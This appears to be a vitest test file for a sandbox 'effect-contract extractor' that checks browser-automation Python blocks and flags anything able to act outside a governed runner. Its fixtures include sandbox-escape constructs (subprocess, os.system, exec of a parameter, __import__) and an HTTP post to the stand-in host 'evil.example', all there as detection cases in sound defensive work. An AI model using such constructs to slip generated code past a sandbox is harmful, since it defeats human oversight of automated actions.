/**
 * The effect-contract extractor (R2-5): terminal `runner.submit` call sites
 * surface as send verbs; anything that could act OUTSIDE the governed runner
 * fails closed to `flagged` — a flagged block never reaches the runner.
 */
import { describe, it, expect } from 'vitest'
import {
  contractAllowsRun,
  contractIsReadOnly,
  extractEffectContract,
} from '../effect-contract.js'

const SENDING_BLOCK = `
def run(runner, params):
    runner.open("https://www.instagram.com/")
    runner.snapshot()
    ref = runner.find(params["follower"])
    runner.click(ref)
    runner.fill("@e5", params["message"])
    runner.submit("@e6", "Send DM to a new follower")
`

const READ_ONLY_BLOCK = `
def run(runner, params):
    runner.open("https://news.ycombinator.com/")
    runner.snapshot()
    runner.scroll(800)
    return runner.current_url()
`

describe('[COMP:sandbox/effect-contract] Effect-contract extractor (R2-5)', () => {
  it('surfaces every runner.submit call site with its literal description', () => {
    const contract = extractEffectContract({
      code: SENDING_BLOCK,
      site: 'instagram.com',
      paramsSchema: { properties: { follower: { type: 'string' }, message: { type: 'string' } } },
    })
    expect(contract.terminalSends).toEqual([
      expect.objectContaining({ description: 'Send DM to a new follower' }),
    ])
    expect(contract.params.sort()).toEqual(['follower', 'message'])
    expect(contract.verbCounts).toMatchObject({ open: 1, snapshot: 1, click: 1, fill: 1 })
    expect(contract.flagged).toEqual([])
    expect(contractAllowsRun(contract)).toBe(true)
    expect(contractIsReadOnly(contract)).toBe(false)
  })

  it('a block with no terminal sends is read-only (the zero-human 1984 case)', () => {
    const contract = extractEffectContract({ code: READ_ONLY_BLOCK, site: 'news.ycombinator.com' })
    expect(contract.terminalSends).toEqual([])
    expect(contractIsReadOnly(contract)).toBe(true)
    expect(contractAllowsRun(contract)).toBe(true)
  })

  it('fails closed on unknown runner verbs', () => {
    const contract = extractEffectContract({
      code: 'def run(runner, params):\n    runner.hack_the_gibson("@e1")\n',
      site: 'x.com',
    })
    expect(contract.flagged).toContain('unknown-verb:hack_the_gibson')
    expect(contractAllowsRun(contract)).toBe(false)
  })

  it('fails closed on constructs that could act outside the runner (subprocess, os.system, raw agent-browser, http)', () => {
    for (const [code, flag] of [
      ['import subprocess\nsubprocess.run(["agent-browser", "click", "@e1"])', 'subprocess'],
      ['import os\nos.system("agent-browser click @e1")', 'os.system'],
      ['def run(runner, params):\n    exec(params["code"])', 'exec()'],
      ['import requests\nrequests.post("https://evil.example")', 'http-client'],
      ['x = __import__("subprocess")', '__import__'],
    ] as const) {
      const contract = extractEffectContract({ code, site: 'x.com' })
      expect(contract.flagged, code).toContain(flag)
      expect(contractAllowsRun(contract)).toBe(false)
    }
  })

  it('does not flag the governed runner.eval verb as python eval()', () => {
    const contract = extractEffectContract({
      code: 'def run(runner, params):\n    runner.eval("window.scrollTo(0, 0)")\n',
      site: 'x.com',
    })
    expect(contract.flagged).toEqual([])
    expect(contract.verbCounts.eval).toBe(1)
  })
})
